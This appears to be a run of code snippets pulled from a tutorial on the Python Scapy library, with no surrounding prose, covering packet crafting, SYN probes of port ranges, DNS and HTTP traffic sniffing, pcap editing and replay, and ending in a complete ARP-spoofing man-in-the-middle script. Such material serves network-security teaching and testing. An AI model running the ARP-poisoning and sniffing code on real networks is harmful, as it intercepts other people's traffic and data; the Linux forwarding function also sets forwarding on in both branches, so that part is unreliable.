["```py\npip install scapy  \n```", "```py\nscapy\nWelcome to Scapy (3.0.0)\n>>>  \n```", "```py\n>>> ls()  \n```", "```py\n>>> ls(UDP)     \n```", "```py\nfrom scapy.all import *\nfrom pprint import pprint  \n```", "```py\nethernet = Ether()  \n```", "```py\nnetwork = IP(dst='192.168.1.1/30')  \n```", "```py\nnetwork = IP(dst='192.168.1.1')  \n```", "```py\nnetwork = IP(dst='192.168.1.1/30')  \n```", "```py\nnetwork = IP(dst = 'rejahrehim.com')  \n```", "```py\nnetwork = IP(dst = ['rejahrehim.com', '192.168.1.1', '192.168.12'])  \n```", "```py\ntransport = TCP(dport=53, flags = 'S')  \n```", "```py\ntransport = TCP(dport=[(53, 100)], flags = 'S')  \n```", "```py\npacket = ethernet/network/transport  \n```", "```py\npprint([pkt for pkt in packet])  \n```", "```py\nfor pkt in packet:\n ls(pkt)\n\n```", "```py\nfor pkt in packet:\n pkt.show()  \n```", "```py\nfrom scapy.all import * \nfrom pprint import pprint \nethernet = Ether() \nnetwork = IP(dst = ['rejahrehim.com']) \ntransport = TCP(dport=[(80)], flags = 'S') \npacket = ethernet/network/transport  \nfor pkt in packet: \n          pkt.show() \n```", "```py\nsudo python3 scapy-packet.py    \n```", "```py\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)  \n```", "```py\nfrom scapy.all import *\nfrom pprint import pprint \n```", "```py\nnetwork = IP(dst = '192.168.1.1')\ntransport = ICMP()\npacket = network/transport\nsend(IP(packet)  \n```", "```py\nethernet = Ether()\nnetwork = IP(dst = '192.168.1.1')\ntransport = ICMP()\npacket = ethernet/network/transport\nsendp(packet, iface=\"en0\")  \n```", "```py\nethernet = Ether()\nnetwork = IP(dst = 'rejahrehim.com')\ntransport = TCP(dport=80)\npacket = ethernet/network/transport\nsr(packet, iface=\"en0\")  \n```", "```py\nsr1(packet, iface=\"en0\")  \n```", "```py\nsrloop(packet)  \n```", "```py\n>>> scapy  \n```", "```py\n>>> pkt = Ether()/IP(dst='192.168.1.1')/TCP(dport=80)\n>>> pkt.show()  \n```", "```py\n>>> pkt.summary()    \n```", "```py\n>>> pkt[TCP].show()\n>>> pkt[2].show()  \n```", "```py\n>>> pkt[IP].dst   \n```", "```py\n>>> if (pkt.haslayer(TCP)):\n....print (\"TCP flags code: \" + str(pkt.getlayer(TCP).flags)  \n```", "```py\n>>> pkts = sniff(filter=\"arp\",count=10)\n>>> print(pkts.summary())  \n```", "```py\nfrom scapy.all import *\npackets = rdpcap(\"sample.pcap\")\npackets.summary()  \n```", "```py\nfor packet in packets:\n    if packet.haslayer(UDP):\n        print(packet.summary())  \n```", "```py\nfrom scapy.all import *    \npackets = []    \ndef changePacketParameters(packet):\npacket[Ether].dst = '00:11:22:dd:bb:aa'\npacket[Ether].src = '00:11:22:dd:bb:aa'    \nfor packet in sniff(offline='sample.pcap', prn=changePacketParameters):\npackets.append(packet)   \nfor packet in packets:\n   if packet.haslayer(TCP):\n       print(packet.show())  \n```", "```py\nwrpcap(\"editted.cap\", packets)    \n```", "```py\nfrom scapy.all import *    \npackets = []    \ndef changePacketParameters(packet):\n    packet[Ether].dst = '00:11:22:dd:bb:aa'\n    packet[Ether].src = '00:11:22:dd:bb:aa'    \ndef writeToPcapFile(pkt):\n    wrpcap('filteredPackets.pcap', pkt, append=True)    \nfor packet in sniff(offline='sample.pcap', prn=changePacketParameters):\n     packets.append(packet)    \nfor packet in packets:\n     if packet.haslayer(TCP):\n         writeToPcapFile(packet)\n         print(packet.show())  \n```", "```py\nsendp(packets)  \n```", "```py\nsendp(rdpcap(\"sample.pcap\"))  \n```", "```py\nimport sys\nfrom scapy.all import *  \n```", "```py\ninterface = \"en0\"\n```", "```py\ndef callBackParser(packet):\n   if IP in packet:\n     source_ip = packet[IP].src\n     destination_ip = packet[IP].dst\n    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:\n      print(\"From : \" + str(source_ip) + \" to -> \" + str(destination_ip) + \"( \" + str(packet.getlayer(DNS).qd.qname) + \" )\")  \n```", "```py\nsniff(iface=interface, prn=callBackParser)    \n```", "```py\nsudo python3 scapy-sniffer.py    \n```", "```py\nif TCP in packet:\n      try:\n          if packet[TCP].dport == 80 or packet[TCP].sport == 80:\n                print(packet[TCP].payload)\n      except:\n           pass\n```", "```py\nfrom scapy.all import *\nimport os\nimport time\nimport sys  \n```", "```py\ninterface = \"en0\"\nsource_ip = \"192.168.1.1\"\ndestination_ip = \"192.168.1.33\"  \n```", "```py\ndef getMAC(IP, interface):\nanswerd, unanswered = srp(Ether(dst = \"ff:ff:ff:ff:ff:ff\")/ARP(pdst = IP), timeout = 5, iface=interface, inter = 0.1)    \nfor send,recieve in answerd:\nreturn recieve.sprintf(r\"%Ether.src%\")  \n```", "```py\ndef setIPForwarding(set): \n    if set:\n        #for OSX\n        os.system('sysctl -w net.inet.ip.forwarding=1')\n    else:\n        #for OSX\n        os.system('sysctl -w net.inet.ip.forwarding=0') \n```", "```py\ndef setIPForwarding(set):\n    if set:\n        #for Linux\n        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')\n    else:\n        #for Linux\n        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')\n```", "```py\ndef resetARP(destination_ip, source_ip, interface):\ndestinationMAC = getMAC(destination_ip, interface)\nsourceMAC = getMAC(source_ip, interface)    \nsend(ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=destinationMAC, retry=7))\nsend(ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=sourceMAC, retry=7))\nsetIPForwarding(False)  \n```", "```py\ndef mitm(destination_ip, destinationMAC, source_ip, sourceMAC):\n    arp_dest_to_src = ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destinationMAC)\n    arp_src_to_dest = ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst=sourceMAC)\n    send(arp_dest_to_src)\n    send(arp_src_to_dest)\n\n```", "```py\ndef callBackParser(packet):\n  if IP in packet:\n      source_ip = packet[IP].src\n      destination_ip = packet[IP].dst\n      print(\"From : \" + str(source_ip) + \" to -> \" + str(destination_ip))  \n```", "```py\ndef main():\n      setIPForwarding(True)    \n      try:\n          destinationMAC = getMAC(destination_ip, interface)\n      except Exception as e:\n          setIPForwarding(False)\n          print(e)\n          sys.exit(1)  \n      try:\n          sourceMAC = getMAC(source_ip, interface)\n      except Exception as e:\n          setIPForwarding(False)\n          print(e)\n          sys.exit(1) \n       while True:\n          try:\n              mitm(destination_ip, destinationMAC, source_ip, sourceMAC)\n              sniff(iface=interface, prn=callBackParser,count=10)\n           except KeyboardInterrupt:\n              resetARP(destination_ip, source_ip, interface)\n              break\n       sys.exit(1)\n   main()  \n```"]